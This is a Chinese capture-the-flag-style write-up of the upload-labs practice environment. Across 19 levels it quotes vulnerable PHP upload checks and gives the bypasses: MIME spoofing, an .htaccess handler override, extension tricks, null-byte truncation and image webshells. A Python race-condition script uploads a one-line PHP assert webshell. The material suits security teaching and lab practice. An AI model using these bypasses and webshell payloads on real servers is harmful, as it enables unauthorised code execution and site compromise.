---
title: upload-labs通关笔记
---

# upload-labs通关笔记

本篇文章仅仅记录通关技巧以及文件上传姿势，具体过程以及相关基础概念就不详细叙述

环境：[upload-labs](https://github.com/c0ny1/upload-labs)（建议用集成环境压缩包或者是docker搭建，手工搭建部分pass可能无法通关）

集成环境下载 一键启动

https://github.com/c0ny1/upload-labs/releases/tag/0.1

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240619214244415.png)


## Pass-01 JS绕过

源码

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
```

开启代理抓包，发现没有产生流量就进行验证了，说明是前端JS验证

直接通过burp抓包改一下限制就好了，或者直接F12删除js限制相关代码。

思路：改webshell后缀为允许上传的.jpg——而后上传——代理拦截，改.jpg为.php——改完后再发送数据包，即可成功上传webshell

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-labs-1.png)

## Pass-02 文件类型绕过

源码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

本关对文件类型进行了限制，依旧可以使用burp进行代理拦截改包

思路：直接上传webshell——burp代理拦截——改文件类型为允许的image/jpeg，然后关闭拦截将改完的包发出即可成功上传

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-labs-2.png)

## Pass-o3 其他可解析类型绕过

源码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这关对文件后缀进行了黑名单限制

```shell
不允许上传.asp .aspx .php .jsp
```

思路：通过扫描工具可以得知是服务器是apache,，所以这里可以利用apache的解析顺序，从右到左开始解析文件后缀，如果最右侧的扩展名不可识别，就继续往左判断，直至遇到可以解析的后缀为止所以如果上传文件名类似1.php.xxxx,因为后缀xxxx不能解析，所以向左解析php。

这里先将文件后缀改为.php3,然后上传成功，结果发现文件路径不对，抓包发现文件名称前缀上传后被改为一个随机名称，这里我们可以通过抓取发送包Repeater获取文件上传后的随机名称

## Pass-04 .htacess文件绕过

```php
#部分源码
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
```

上传.htacess文件绕过：几乎过滤了所有的后缀名，除了.htaccess

这里用命令行生成一个.htaccess文件，

```
rename .htaccess
```

文件内容如下

```shell
SetHandler application/x-httpd-php
```

先上传这个.htaccess文件，文件作用是往后所有文件都会解析为php，然后再上传图片木马文件（用kali制作，这里就不再赘述），发现能成功上传并解析。

## Pass-05 大小写绕过

```php
#部分源码
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini")
```

大小写绕过：这关依旧有强大的黑名单，并且限制了.htaccess文件的上传，直接后缀大小写绕过1.phP,用burp查看上传后的文件目录及其名称。

## Pass-06 空格绕过

这关使用大小写绕过失败，文件被不允许上传，查看源码

```php
#部分源码
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
```

依旧具有强大的黑名单，并且对后缀进行了大小写处理，利用Windows系统的文件名特性。文件名最后增加空格，写成3.php ，上传后保存在Windows系统上的文件名最后的一个空格会被去掉，实际上保存的文件名就是3.php.
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-06-1.png)

成功

## Pass-07 点绕过

这关和Pass-06差不多，直接点绕过

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-07-1.png)

## Pass-08 ::$DATA绕过

Windows文件流特性绕过，文件名改成3.php::$DATA，上传成功后保存的文件名其实是3.php

## Pass-09 点+空格+点绕过

原理同Pass-06，上传文件名后加上点+空格+点，改为3.php. .

## Pass-10 双写绕过

双写文件名绕过，文件名改成3.pphphp

## Pass-11 文件路径%00截断

本关技巧为00截断，相关概念请移步csdn查阅相关资料，这里就不加赘述，只介绍相关思路。
查看源码

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

此关为白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过

```php
$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

本关使用%00截断成功绕过，如果以下条件不满足则可能无法突破

```php
php版本小于5.3.4，php的magic_quotes_gpc为OFF状态
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-11-1.png)

如上图所示先将上传文件名改为3.jpg,burp代理拦截后将save_path改成…/upload/11.php%00，最后保存下来的文件就是3.php，再用蚁剑去连测试成功
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-2.png)

## Pass-12文件路径0x00截断

源码

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要自行修改，这里先将文件抓包改为3.php ,并选中空格
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-1.png)

右边多出来的inspector模块中编辑hex，改为00.而后点击Apply changes就可以了
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-3.png)

然后发送数据包，查看路径，蚁剑连接。
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-4.png)

## Pass-13 图片马绕过

查看源码

```php
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

这关通过读文件的前2个字节判断文件类型，因此直接上传图片马即可。

利用kali制作图片马

```shell
cat 3.php >>3.jpg
```

上传后利用文件包含解析该文件即可

## Pass-14 图片马 getimagesize()

查看源码可知这关是用getimagesize函数判断文件类型，同样也可用图片马

```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```



## Pass-15 图片马 exif_imagetype()

查看源码可知这关是用exif_imagetype()函数判断文件类型，同样可用图片马

```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

## Pass-16 二次渲染绕过

查看源码

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后还做了一次二次渲染，改变了图片中的部分内容。

突破思路：将一个正常显示的图片，上传到服务器。将图片被渲染后与原始图片对比，寻找仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。

## Pass-17 条件竞争

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

条件竞争：先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，反之删除，因此我们可以上传3.php只需要在它删除之前访问即可。

思路一：这里可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可。

思路二：首先pip install hackhttp安装hackhttp模块，然后运行下面的Python脚本即可。在运行的同时连接webshell。
Python脚本如下

```python
import hackhttp
from multiprocessing.dummy import Pool as ThreadPool

def upload(lists):
    hh = hackhttp.hackhttp()
    raw = """POST /Pass-17/index.php HTTP/1.1
Host: 192.168.160.141
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.160.141/Pass-17/index.php
Cookie: pass=17
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------6696274297634
Content-Length: 341

-----------------------------6696274297634
Content-Disposition: form-data; name="upload_file"; filename="3.php"
Content-Type: application/octet-stream

<?php assert($_POST["LandGrey"])?>
-----------------------------6696274297634
Content-Disposition: form-data; name="submit"

上传
-----------------------------6696274297634--
"""
    code, head, html, redirect, log = hh.http('http://192.168.160.141/Pass-17/index.php', raw=raw)
    print(str(code) + "\r")

pool = ThreadPool(10)
pool.map(upload, range(10000))
pool.close()
pool.join()
```

## Pass-18  上传重命名绕过

查看源码

```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```

利用上传重命名竞争+Apache解析漏洞，成功绕过
上传名字为3.php.7Z的文件，快速重复提交该数据包，会让服务器来不及重命名，从而上传成功，并不被重命名。

## Pass-19 00截断

查看源码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

观察发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过
后面的同Pass-12中一样。
